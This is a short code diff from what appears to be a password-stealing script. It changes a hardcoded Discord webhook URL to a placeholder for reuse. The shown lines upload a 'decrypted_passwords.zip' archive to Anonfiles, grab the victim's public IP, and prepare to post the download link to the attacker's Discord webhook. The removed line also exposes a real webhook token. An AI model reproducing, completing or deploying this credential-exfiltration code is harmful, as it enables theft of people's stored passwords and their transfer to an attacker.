@@ -89,7 +89,7 @@ def main():
     download_link = uploadToAnonfiles('decrypted_passwords.zip')
 
     if download_link:
-        webhook_url = 'https://discord.com/api/webhooks/1174479214230110239/4XElbEnjk2OrMPEY6vkuymOKBWddEkdU1XnALK1lpDLNuratOIU8vAY5gEytC8m4-_AR' #replace by your webhook url
+        webhook_url = 'YOUR_WEBHOOK' #replace by your webhook url
         ip_address = requests.get("https://api.ipify.org/").text
         embeds = {
             "avatar_url": "https://media.discordapp.net/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&=&width=581&height=581",
